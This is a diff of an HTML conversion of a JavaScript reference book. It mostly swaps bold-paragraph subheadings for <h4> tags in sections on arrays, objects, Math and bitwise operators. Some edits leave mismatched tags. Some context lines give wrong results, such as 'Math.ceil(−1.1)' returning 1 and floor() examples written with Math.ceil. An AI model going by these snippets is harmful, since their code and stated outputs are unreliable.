@@ -541,10 +541,10 @@ document.body.appendChild(img);
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch2">Chapter 2: JavaScript Variables</h2>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>variable_name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{Required} The name of the variable: used when calling it.</b></p>
+<h4>variable_name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{Required} The name of the variable: used when calling it.</h4>
 <p>= &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>&lbrack;Optional&rbrack;</b> Assignment (defining the variable)</p>
 <p>value &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp<b>{Required when using Assignment}</b> The value of a variable
-<b>&lbrack;default: undefined&rbrack;</b></p>
+<b>&lbrack;default: undefined&rbrack;</h4>
 <p>Variables are what make up most of JavaScript. These variables make up
 things from numbers to objects, which are all over JavaScript to make
 one's life much easier.</p>
@@ -1809,7 +1809,7 @@ possible, or the JavaScript representation if not. Calling console.dirxml() on H
 and XML elements is equivalent to calling console.log().</p>
 <!-- page 31 -->
 
-<p><b>Example 1:</h4>
+<h4>Example 1:</h4>
 
 <pre>console.dirxml ( document )</pre>
 
@@ -1823,7 +1823,7 @@ and XML elements is equivalent to calling console.log().</p>
   style="border: 2px solid #000000; width:7.477in;" />
 <!-- ![](./images/image020.jpg){width="7.477777777777778in" height="1.6847222222222222in"} -->
 
-<p><b>Example 2:</h4>
+<h4>Example 2:</h4>
 
 <pre>
 console.log(document)
@@ -3726,7 +3726,7 @@ guaranteed to be <b>false</b>.</p>
 <p>In x &vert;&vert; y, y will not be evaluated if x evaluated to <b>true</b>, because the whole expression 
 is guaranteed to be <b>true</b>.</p>
 
-<p><b>Example with functions</h4>
+<h4>Example with functions</h4>
 
 <p>Take the following two functions:</p>
 
@@ -6375,7 +6375,7 @@ the original array</p>
 <pre>
 arr.length = 0;
 </pre>
-<h4>Method 3</b></p>
+<h4>Method 3</h4>
 <p>Similar to method 2 but returns a new array containing the removed
 items. If you do not need the items this method is inefficient as the
 new array is still created only to be immediately dereferenced.</p>
@@ -6616,7 +6616,7 @@ target="_blank" rel="noopener noreferrer">.apply()</a>:</p>
 console.log(flatten(arrL1));  // <i>&lbrack;1, 2, 3, 4&rbrack;</i>
 </pre>
 
-<p><b>Higher Dimension Arrays</b></p>
+<h4>Higher Dimension Arrays</h4>
 
 <p>Given a deeply nested array like so</p>
 
@@ -6645,7 +6645,7 @@ flattened by this method.</p>
 <h3 id="ch12-27">Section 12.27: Append / Prepend items to Array</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <!-- page 107 -->
-<p><b>Unshift</b></p>
+<h4>Unshift</h4>
 <p>Use .unshift to add one or more items in the beginning of an array.</p>
 <p>For example:</p>
 <pre>
@@ -6656,7 +6656,7 @@ array.unshift(1, 2);
 <pre>
 &lbrack;1, 2, 3, 4, 5, 6&rbrack;
 </pre>
-<p><b>Push</b></p>
+<h4>Push</h4>
 <p>Further is used to add items after the last currently existent item.</p>
 <p>For example:</p>
 <pre>
@@ -6859,13 +6859,13 @@ data.every((item, i, list) =&gt; item.name === list&lbrack;0&rbrack;.name);  // 
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The slice() method returns a copy of a portion of an array.</p>
 It takes two parameters, arr.slice(&lbrack;begin&lbrack;, end&rbrack;&rbrack;):</p>
-<p><b>begin</b></p>
+<h4>begin</h4>
 <p>Zero-based index which is the beginning of extraction.</p>
-<p><b>end</b></p>
+<h4>end</h4>
 <p>Zero-based index which is the end of extraction, slicing up to this index but 
 it&apos;s not included.</p>
 <p>If the end is a negative number, end = arr.length + end.</p>
-<p><b>Example 1</b></p>
+<h4>Example 1</h4>
 <!-- page 111 -->
 <pre>
 // <i>Let&apos;s say we have this Array of Alphabets</i>
@@ -6873,7 +6873,7 @@ it&apos;s not included.</p>
 // <i>I want an Array of the first two Alphabets</i>
 <b>var</b> newArr = arr.slice(0, 2);  // <i>newArr === &lbrack;&quot;a&quot;, &quot;b&quot;&rbrack;</i>
 </pre>
-<p><b>Example 2</b></p>
+<h4>Example 2</h4>
 <pre>
 // <i>Let&apos;s say we have this Array of Numbers</i>
 // <i>and I don&apos;t know it&apos;s end</i>
@@ -7173,7 +7173,7 @@ will be called to retrieve the value from the property.</p>
 property has been assigned a value, and the new value will be passed
 as an argument.</p>
 <p>You cannot assign a value or writable to a descriptor that has <b>get</b>
-or <b>set</b></p>
+or <b>set</h4>
 <pre>
 <b>var</b> person = { name: &quot;John&quot;, surname: &quot;Doe&quot;};
 Object.defineProperty(person, &apos;fullName&apos;, {
@@ -7626,7 +7626,7 @@ property cannot be of both types.</p>
   enumerable: <b>true</b>
 }
 </pre>
-<p><b>meaning of fields and their defaults</b></p>
+<h4>meaning of fields and their defaults</h4>
 <p>configurable,enumerable and writable:</p>
 <ul>
   <li>These keys all default to <b>false</b>.</li>
@@ -7705,7 +7705,7 @@ possible using &lbrack;&rbrack; bracket notation.</p>
 myObject&lbrack;&apos;special property ☺&apos;&rbrack; = &apos;it works!&apos;
 console.log(myObject&lbrack;&apos;special property ☺&apos;&rbrack;)
 </pre>
-<p><b>All-digit properties:</b></p>
+<h4>All-digit properties:</h4>
 <p>In addition to special characters, property names that are all-digits
 will require bracket notation. However, in this case the property need
 not be written as a string.</p>
@@ -7808,7 +7808,7 @@ the prototype chain as well).</p>
 <b>var</b> obj = { 0: &apos;a&apos;, 1: &apos;b&apos;, 2: &apos;c&apos; };
 console.log(Object.values(obj));  // <i>&lbrack;&apos;a&apos;, &apos;b&apos;, &apos;c&apos;&rbrack;</i>
 </pre>
-<p><b>Note:</b></p>
+<h4>Note:</h4>
 <p>For browser support, please refer to this <a href="http://kangax.github.io/compat-table/es2016plus/#test-Object.values">
 link</a></p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -7976,7 +7976,7 @@ become n-1.</p>
 <p>Now we can call delta() function passing any integer, both positive and negative, 
 as delta parameter.</p>
 
-<p><b>Using modulus to obtain the fractional part of a number</b></p>
+<h4>Using modulus to obtain the fractional part of a number</h4>
 <pre>
 <b>var</b> myNum = 10 / 4;       // <i>2.5</i>
 <b>var</b> fraction = myNum &percnt; 1; // <i>0.5</i>
@@ -7986,7 +7986,7 @@ fraction = myNum &percnt; 1;        // <i>-0.857142857142857</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch14-3">Section 14.3: Rounding</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Rounding</b></p>
+<h4>Rounding</h4>
 <p>Math.round() will round the value to the closest integer using <i>half round up</i>
 to break ties.</p>
 <pre>
@@ -8003,7 +8003,7 @@ to break ties.</p>
 up, that is they&apos;re rounded to the integer with the next higher value.</p>
 <!-- page 131 -->
 
-<p><b>Rounding up</b></p>
+<h4>Rounding up</h4>
 <p>Math.ceil() will round the value up.</p>
 <pre>
 <b>var</b> a = Math.ceil(2.3);  // <i>a is now 3</i>
@@ -8013,7 +8013,7 @@ up, that is they&apos;re rounded to the integer with the next higher value.</p>
 <pre>
 <b>var</b> c = Math.ceil(&minus;1.1);  // <i>c is now 1</i>
 </pre>
-<p><b>Rounding down</b></p>
+<h4>Rounding down</h4>
 <p>Math.floor() will round the value down.</p>
 <pre>
 <b>var</b> a = Math.floor(2.3);  // <i>a is now 2</i>
@@ -8023,7 +8023,7 @@ up, that is they&apos;re rounded to the integer with the next higher value.</p>
 <pre>
 <b>var</b> c = Math.floor(&minus;1.1);  // <i>c is now -1</i>
 </pre>
-<p><b>Truncating</b></p>
+<h4>Truncating</h4>
 
 <p><b>Caveat</b>: using bitwise operators (except &gt;&gt;&gt;) only applies to
 numbers between &minus;2147483649 and 2147483648.</p>
@@ -8043,7 +8043,7 @@ Math.trunc(2147483648.1);  // <i>2147483648 (floor)</i>
 Math.trunc(-2147483649.1); // <i>-2147483649 (ceil)</i>
 Math.trunc(<b>NaN</b>);    // <i>NaN</i>
 </pre>
-<p><b>Rounding to decimal places</b></p>
+<p><b>Rounding to decimal places</h4>
 <p>Math.floor, Math.ceil(), and Math.round() () can be used to round to a number of 
 decimal places</p>
 
@@ -8094,7 +8094,7 @@ roundTo(myNum, &minus;2);  // <i>3300</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>All angles below are in radians. An angle r in radians has measure 180 &ast; r / Math.PI 
 in degrees.</p>
-<p><b>Sine</b></p>
+<h4>Sine</h4>
 <pre>
 Math.sin(r);
 </pre>
@@ -8107,7 +8107,7 @@ Math.asin(r);
 Math.asinh(r);
 </pre>
 <p>This will return the hyperbolic arcsine of r.</p>
-<p><b>Cosine</b></p>
+<h4>Cosine</h4>
 <pre>
 Math.cos(r);
 </pre>
@@ -8121,7 +8121,7 @@ Math.acosh(r);
 </pre>
 <!-- page 133 -->
 <p>This will return the hyperbolic arccosine of r.</p>
-<p><b>Tangent</b></p>
+<h4>Tangent</h4>
 <pre>
 Math.tan(r);
 </pre>
@@ -8146,7 +8146,7 @@ return a value between &minus;π and π, not including π.</p>
 <p>Note that all bitwise operations operate on 32-bit integers by passing
 any operands to the internal function <a href="http://www.ecma-international.org/ecma-262/6.0/#sec-toint32">
 ToInt32</a>.
-<p><b>Bitwise or</b></p>
+<h4>Bitwise or</h4>
 <pre>
 <b>var</b> a;
 a = 0b0011 &vert; 0b1010;  // <i>a === 0b1011</i>
@@ -8155,7 +8155,7 @@ a = 0b0011 &vert; 0b1010;  // <i>a === 0b1011</i>
 // <i>0011</i>
 // <i>1011 (result)</i>
 </pre>
-<p><b>Bitwise and</b></p>
+<h4>Bitwise and</h4>
 <pre>
 a = 0b0011 &amp; 0b1010;  // <i>a === 0b0010</i>
 // <i>truth table</i>
@@ -8163,14 +8163,14 @@ a = 0b0011 &amp; 0b1010;  // <i>a === 0b0010</i>
 // <i>0011</i>
 // <i>0010 (result)</i>
 </pre>
-<p><b>Bitwise not</b></p>
+<h4>Bitwise not</h4>
 <pre>
 a = &bsol;0b0011;  // <i>a === 0b1100</i>
 // <i>truth table</i>
 // <i>10 &bsol;~(not)</i>
 // <i>01 (result)</i>
 </pre>
-<p><b>Bitwise xor (exclusive or)</b></p>
+<h4>Bitwise xor (exclusive or)</h4>
 <pre>
 a = 0b1010 &Hat; 0b0011;  // <i>a === 0b1001</i>
 // <i>truth table</i>
@@ -8178,7 +8178,7 @@ a = 0b1010 &Hat; 0b0011;  // <i>a === 0b1001</i>
 // <i>0011</i>
 // <i>1001 (result)</i>
 </pre>
-<p><b>Bitwise left shift</b></p>
+<h4>Bitwise left shift</h4>
 <pre>
 a = 0b0001 &lt;&lt; 1;  // <i>a === 0b0010</i>
 a = 0b0001 &lt;&lt; 2;  // <i>a === 0b0100</i>
@@ -8195,8 +8195,8 @@ math, shift can significantly improve the speed of some math operations.</p>
 // <i>result is true</i>
 a = 5.4 &lt;&lt; n;  // <i>20</i>
 </pre>
-<p><b>Bitwise right shift &gt;&lpar;Sign-propagating shift) &gt;&gt;&lpar;Zero-fill
-right shift)</b></p>
+<h4>Bitwise right shift &gt;&lpar;Sign-propagating shift) &gt;&gt;&lpar;Zero-fill
+right shift)</h4>
 <pre>
 a = 0b1001 &gt;&gt; 1;  // <i>a === 0b0100</i>
 a = 0b1001 &gt;&gt; 2;  // <i>a === 0b0010</i>
@@ -8240,7 +8240,7 @@ a = &minus;256.67;
 result = (a &gt;&gt;&gt; n) === Math.floor( Math.floor(a) / Math.pow(2, n) );
 // <i>result is false</i>
 </pre>
-<p><b>Bitwise assignment operators</b></p>
+<h4>Bitwise assignment operators</h4>
 <p>With the exception of not (&bsol;~) all the above bitwise operators can be
 used as assignment operators:</p>
 <pre>
@@ -8316,7 +8316,7 @@ prior to the operation).</p>
 </pre>
 <!-- page 136 -->
 <p>c will now be 8</p>
-<p><b>Use Math.pow to find the nth root of a number.</b></p>
+<h4>Use Math.pow to find the nth root of a number.</h4>
 <p>Finding the nth roots is the inverse of raising to the nth power. For
 example 2 to the power of 5 is 32. The 5th root of 32 is 2.</p>
 <pre>
@@ -8611,7 +8611,7 @@ Math.min( 4, 12 );  // <i>4</i>
 Math.min(&minus;1, &minus;15); // <i>-15</i>
 </pre>
 <!-- page 140 -->
-<p><b>Getting maximum and minimum from an array:</b></p>
+<h4>Getting maximum and minimum from an array:</h4>
 <pre>
 <b>var</b> arr = &lbrack;1, 2, 3, 4, 5, 6, 7, 8, 9&rbrack;,
 max = Math.max.apply(Math, arr),
@@ -8646,15 +8646,15 @@ console.log(clamp(&minus;10, 10, &minus;15));    // <i>-10</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch14-17">Section 14.17: Ceiling and Floor</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>ceil()</b></p>
+<h4>ceil()</h4>
 <p>The ceil() method rounds a number </i>upwards</i> to the nearest integer, and
 returns the result.</p>
 
-<p><b>Syntax:</b></p>
+<h4>Syntax:</h4>
 <pre>
 Math.ceil(n);
 </pre>
-<p><b>Example:</b></p>
+<h4>Example:</h4>
 <pre>
 console.log(Math.ceil(0.60)); // <i>1</i>
 console.log(Math.ceil(0.40)); // <i>1</i>
@@ -8664,12 +8664,12 @@ console.log(Math.ceil(&minus;5.9)); // <i>-5</i>
 </pre>
 <p>The floor() method rounds a number </i>downwards</i> to the nearest integer, and
 returns the result.</p>
-<p><b>Syntax:</b></p>
+<h4>Syntax:</h4>
 <!-- page 142 -->
 <pre>
 Math.floor(n);
 </pre>
-<p><b>Example:</b></p>
+<h4>Example:</h4>
 <pre>
 console.log(Math.ceil(0.60)); // <i>0</i>
 console.log(Math.ceil(0.40)); // <i>0</i>
@@ -8680,18 +8680,18 @@ console.log(Math.ceil(&minus;5.9)); // <i>-6</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch14-18">Section 14.18: Getting roots of a number</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Square Root</b></p>
+<h4>Square Root</h4>
 <p>Use Math.sqrt() to find the square root of a number</p>
 <pre>
 Math.sqrt(16)  #=&gt; 4
 </pre>
-<p><b>Cube Root</b></p>
+<h4>Cube Root</h4>
 <p>To find the cube root of a number, use the Math.cbrt() function</p>
 <h5>Version ≥ 6</h5>
 <pre>
 Math.cbrt(27) #=&gt; 3
 </pre>
-<p><b>Finding nth-roots</b></p>
+<h4>Finding nth-roots</h4>
 <p>To find the nth-root, use the Math.pow() function and pass in a fractional exponent.</p>
 <pre>
 Math.pow(64, 1/6) #=&gt; 2
@@ -8752,12 +8752,12 @@ point to another point.</p>
 <p>Math.atan( yComponent, xComponent ) return the angle in radius Math.PI to 
 Math.PI(- 180 within the range of ?? to 180 deg)</p>
 
-<p><b>Direction of a vector</b></p>
+<h4>Direction of a vector</h4>
 <pre>
 <b>var</b> vec = {x : 4, y : 3};
 <b>var</b> dir = Math.atan2(vec.y, vec.x); // <i>0.6435011087932844</i>
 </pre>
-<p><b>Direction of a line</b></p>
+<h4>Direction of a line</h4>
 <pre>
 <b>var</b> line = {
   p1 : { x : 100, y : 128},
@@ -8766,7 +8766,7 @@ Math.PI(- 180 within the range of ?? to 180 deg)</p>
 // <i>get the direction from p1 to p2</i>
 <b>var</b> dir = Math.atan2(line.p2.y &minus; line.p1.y, line.p2.x &minus; line.p1.x);  // <i>0.5269432271894297</i>
 </pre>
-<p><b>Direction from a point to another point</b></p>
+<h4>Direction from a point to another point</h4>
 <pre>
 <b>var</b> point1 = { x: 123, y : 294};
 <b>var</b> point2 = { x: 354, y : 284};
@@ -8942,7 +8942,7 @@ console.log(15 / 4);  // <i>3.75</i>
     c = a      // <i>4</i>
 </pre>
 <p>In this case, b is set to the new value of a. So, b will be 4, and c will be 4.</p>
-<p><b>Common Uses</b></p>
+<h4>Common Uses</h4>
 <p>The decrement and increment operators are commonly used in <b>for</b> loops, for example:</p>
 <pre>
 <b>for</b> (<b>var</b> i = 42; i &gt; 0; &minus;i) {
@@ -8977,7 +8977,7 @@ console.log(3&minus;)  // <i>ReferenceError: Invalid left-hand side expression i
 <p>Bitwise operators perform operations on bit values of data. These
 operators convert operands to signed 32-bit integers in <a href="http://stackoverflow.com/questions/1049722/what-is-2s-complement">two&apos;s
 complement</a>.</p>
-<p><b>Conversion to 32-bit integers</b></p>
+<h4>Conversion to 32-bit integers</h4>
 <p>Numbers with more than 32 bits discard their most significant bits.
 For example, the following integer with more than 32 bits is converted
 to a 32-bit integer:</p>
@@ -8985,7 +8985,7 @@ to a 32-bit integer:</p>
 Before: 10100110111110100000000010000011110001000001
 After: 10100000000010000011110001000001
 </pre>
-<p><b>Two&apos;s Complement</b></p>
+<h4>Two&apos;s Complement</h4>
 <p>In normal binary we find the binary value by adding the 1&apos;s based on
 their position as powers of 2 - The rightmost bit being 2&Hat;0 to the
 leftmost bit being 2&Hat;n-1 where n is the number of bits. For example,
@@ -9010,7 +9010,7 @@ inverted bits of 6 would be:</p>
 change its value in two&apos;s compliment. The value 1010 and
 1111111111010 are both -6.</p>
 
-<p><b>Bitwise AND</b></p>
+<h4>Bitwise AND</h4>
 <p>The bitwise AND operation a &amp; b returns the binary value with a 1 where both
 binary operands have 1&apos;s in a specific position, and 0 in all other
 positions. For example:</p>
@@ -9021,7 +9021,7 @@ positions. For example:</p>
 //<i>&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&ast;</i>
 // <i>5: 0..00101 (0 + 0 + 4 + 0 + 1)</i>
 </pre>
-<p><b>Real world example: Number&apos;s Parity Check</b></p>
+<h4>Real world example: Number&apos;s Parity Check</h4>
 <p>Instead of this &quot;masterpiece&quot; (unfortunately too often seen in many
 real code parts):</p>
 <!-- page 149 -->
@@ -9046,7 +9046,7 @@ and simple manner:</p>
   console.log(&quot;EVEN!&quot;);
 }
 </pre>
-<p><b>Bitwise OR</b></p>
+<h4>Bitwise OR</h4>
 <p>The bitwise OR operation returns the binary value with a 1 where
 either operands or both operands have 1&apos;s in a specific position, and
 0 when both values have 0 in a position. For example:</p>
@@ -9057,7 +9057,7 @@ either operands or both operands have 1&apos;s in a specific position, and
 // <i>&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&ast;
 // <i>15: 0..01111 (0 + 8 + 4 + 2 + 1)</i>
 </pre>
-<p><b>Bitwise NOT</b></p>
+<h4>Bitwise NOT</h4>
 
 <p>The bitwise NOT operation &bsol;~a <i>flips</i> the bits of the given value a.
 This means all the 1&apos;s will become 0&apos;s and all the 0&apos;s will become
@@ -9068,7 +9068,7 @@ This means all the 1&apos;s will become 0&apos;s and all the 0&apos;s will becom
 //&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&bsol;</i>
 //-14: 1..10010 (-16 + 0 + 0 + 2 + 0)
 </pre>
-<p><b>Bitwise XOR</b></p>
+<h4>Bitwise XOR</h4>
 <p>The bitwise XOR (<i>exclusive or</i>) operation a &Hat; b places a 1 only if the two
 bits are different. Exclusive or means <i>either one or the other, but
 not both</i>.</p>
@@ -9079,7 +9079,7 @@ not both</i>.</p>
 //<i>&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&ast;</i>
 // <i>10: 0..01010 (0 + 8 + 0 + 2 + 0)</i>
 </pre>
-<p><b>Real world example: swapping two integer values without additional memory allocation</b></p>
+<h4>Real world example: swapping two integer values without additional memory allocation</h4>
 <pre>
 <b>var</b> a = 11, b = 22;
 a = a &Hat; b;
@@ -9093,7 +9093,7 @@ console.log(&quot;a = &quot; &plus; a &plus; &quot;; b = &quot; &plus; b); // <i
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Bitwise shifting can be thought as &quot;moving&quot; the bits either left or
 right, and hence changing the value of the data operated on.</p>
-<p><b>Left Shift</b></p>
+<h4>Left Shift</h4>
 <p>The left shift operator (value) &lt;&lt; (shift amount) will shift the bits to the left
 by (shift amount) bits; the new bits coming in from the right will be 0&apos;s:</p>
 <pre>
@@ -9101,7 +9101,7 @@ by (shift amount) bits; the new bits coming in from the right will be 0&apos;s:<
 // <i>5: 0..000101</i>
 // <i>20: 0..010100 &lt;= adds two 0&apos;s to the right</i>
 </pre>
-<p><b>Right Shift (<i>Sign-propagating</i>)</b></p>
+<h4>Right Shift (<i>Sign-propagating</i>)</h4>
 
 <p>The right shift operator (value) &gt;&gt; (shift amount) is also known as the 
 &quot;Sign-propagating right shift&quot; because it keeps the sign of the initial 
@@ -9118,7 +9118,7 @@ left-most bit was 1 then the new bits will all be 1 and vice-versa for 0&apos;s.
 // <i>-5: 1..111011</i>
 // <i>-2: 1..111111 &lt;= added three 1&apos;s from the left and chopped off 011 from the right</i>
 </pre>
-<p><b>Right Shift (<i>Zero fill</i>)</b></p>
+<h4>Right Shift (<i>Zero fill</i>)</h4>
 
 <p>The zero-fill right shift operator (value) &gt;&gt;&gt; (shift amount) will move the bits to the right,
 and the new bits will be 0&apos;s. The 0&apos;s are shifted in from the left, and excess bits to the
@@ -9196,7 +9196,7 @@ console.log(&apos;The name of the person is&apos;, person.name);
 person.surname = &quot;Fox&quot;;
 console.log(&apos;The name of the person is&apos;, person.name, &apos;and the surname is&apos;, person.surname);
 </pre>
-<p><b>Result:</b></p>
+<h4>Result:</h4>
 <pre>
 The name of the person is John
 The name of the person is Steve
@@ -9215,7 +9215,7 @@ we&apos;ve reassigned property and created new property.</p>
 <b>const</b> fun = <b>function</b> () = { /&ast; &hellip; &ast;/};
 <b>const</b> arrowFun = () =&gt; /&ast; &hellip; &ast;/;
 </pre>
-<p><b>Important</b></p>
+<h4>Important</h4>
 <p>You must declare and initialize a constant in the same statement.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch17-3">Section 17.3: Declaration</h3>
@@ -9247,7 +9247,7 @@ for technical reasons. Continue reading to see an example.)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch17-4">Section 17.4: Undefined</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p>Declared variable without a value will have the value <b>undefined</b></p>
+<p>Declared variable without a value will have the value <b>undefined</h4>
 <pre>
 <b>var</b> a;
 console.log(a);  // <i>logs: undefined</i>
@@ -9291,7 +9291,7 @@ used as different types:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch17-6">Section 17.6: Mathematic operations and assignment</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Increment by</b></p>
+<h4>Increment by</h4>
 <pre>
 <b>var</b> a = 9,
 b = 3;
@@ -9302,7 +9302,7 @@ b += a;
 <pre>
 b = b &plus; a;
 </pre>
-<p><b>Decrement by</b></p>
+<h4>Decrement by</h4>
 <pre>
 <b>var</b> a = 9,
 b = 3;
@@ -9313,7 +9313,7 @@ b -= a;
 <pre>
 b = b &minus; a;
 </pre>
-<p><b>Multiply by</b></p>
+<h4>Multiply by</h4>
 <pre>
 <b>var</b> a = 5,
 b = 3;
@@ -9324,7 +9324,7 @@ b &ast;= a;
 <pre>
 b = b &ast; a;
 </pre>
-<p><b>Divide by</b></p>
+<h4>Divide by</h4>
 <pre>
 </b>var</b> a = 3,
 b = 15;
@@ -9336,7 +9336,7 @@ b /= a;
 b = b / a;
 </pre>
 <h5>Version ≥ 7</h5>
-<p><b>Raised to the power of</b></p>
+<h4>Raised to the power of</h4>
 <pre>
 <b>var</b> a = 3,
 b = 15;
@@ -9400,7 +9400,7 @@ and assignment expressions occur (var a, b, c = 2, d:) does not matter. You may 
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch18-1">Section 18.1: Standard &quot;for&quot; loops</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Standard usage</b></p>
+<h4>Standard usage</h4>
 <pre>
 <b>for</b> (<b>var</b> i = 0; i &lt; 100; i++) {
   console.log(i);
@@ -9413,7 +9413,7 @@ and assignment expressions occur (var a, b, c = 2, d:) does not matter. You may 
 &hellip;<br/>
 99
 </blockquote>
-<p><b>Multiple declarations</b></p>
+<h4>Multiple declarations</h4>
 <p>Commonly used to cache the length of an array.</p>
 <pre>
 <b>var</b> array = &lbrack;&apos;a&apos;, &apos;b&apos;, &apos;c&apos;&rbrack;;
@@ -9427,7 +9427,7 @@ and assignment expressions occur (var a, b, c = 2, d:) does not matter. You may 
 &apos;b&apos;<br/>
 &apos;c&apos;
 </blockquote>
-<p><b>Changing the increment</b></p>
+<h4>Changing the increment</h4>
 <pre>
 <b>for</b> (<b>var</b> i = 0; i &lt; 100; i += 2 /&ast; Can also be: i = i + 2 &ast;/ ) {
   console.log(i);
@@ -9441,7 +9441,7 @@ and assignment expressions occur (var a, b, c = 2, d:) does not matter. You may 
 &hellip;<br/>
 98
 </blockquote>
-<p><b>Decremented loop</b></p>
+<h4>Decremented loop</h4>
 <pre>
 <b>for</b> (<b>var</b> i = 100; i &gt;=0; i&bsol;) {
   console.log(i);
@@ -9478,8 +9478,8 @@ and assignment expressions occur (var a, b, c = 2, d:) does not matter. You may 
   <li>It avoids all the pitfalls of for&hellip;in</li>
   <li>nlike (), it works with break, continue, and return</li>
 </ul>
-<p><b>Support of for&hellip;of in other collections</b></p>
-<p><b>Strings</b></p>
+<h4>Support of for&hellip;of in other collections</h4>
+<h4>Strings</h4>
 <p>for&hellip;of will treat a string as a sequence of Unicode characters:</p>
 <pre>
 <b>const</b> string = &quot;abc&quot;;
@@ -9491,9 +9491,9 @@ and assignment expressions occur (var a, b, c = 2, d:) does not matter. You may 
 <blockquote>
 a b c
 </blockquote>
-<p><b>Sets</b></p>
+<h4>Sets</h4>
 <p>for&hellip;of works on Set objects.</p>
-<p><b>Note</b>:</p>
+<h4>Note</b>:</p>
 <ul>
   <li>A Set object will eliminate duplicates.</li>
   <li>Please <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Set#Browser_compatibility" 
@@ -9515,7 +9515,7 @@ alejandro<br/>
 zandra<br/>
 anna
 </blockquote>
-<p><b>Maps</b></p>
+<h4>Maps</h4>
 <p>You can also use for&hellip;of loops to iterate over Maps. This works
 similarly to arrays and sets, except the iteration variable stores both a key and a value.</p>
 <pre>
@@ -9539,7 +9539,7 @@ similarly to arrays and sets, except the iteration variable stores both a key an
   <i>def is mapped to 2</i>
 <i>&ast;/</i>
 </pre>
-<p><b>Objects</b></p>
+<h4>Objects</h4>
 <p>for&hellip;of loops <i>do not</i> work directly on plain Objects; but, it is
 possible to iterate over an object's properties by switching to a
 for&hellip;in loop, or using Object.keys():</p>
@@ -9587,7 +9587,7 @@ object.c, baz
